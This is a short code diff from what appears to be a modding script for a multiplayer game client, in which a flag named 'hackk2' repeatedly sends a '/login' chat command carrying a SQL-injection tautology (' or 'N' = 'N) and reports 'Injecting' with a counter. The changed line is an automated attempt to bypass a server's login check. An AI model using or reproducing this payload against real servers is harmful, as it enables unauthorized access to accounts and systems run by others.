@@ -10957,7 +10957,7 @@ function rptask() {
                     }
                     if(hackk2){
                     	numhack2++
-                    	Server.sendChat(numhack2+"' or '"+numhack2+"' = '"+numhack2);
+                    	Server.sendChat("/login "+numhack2+"' or '"+numhack2+"' = '"+numhack2);
                     	clientMessage(client + "Injecting: "+numhack2);
                     }
                     if (autodestroy) {
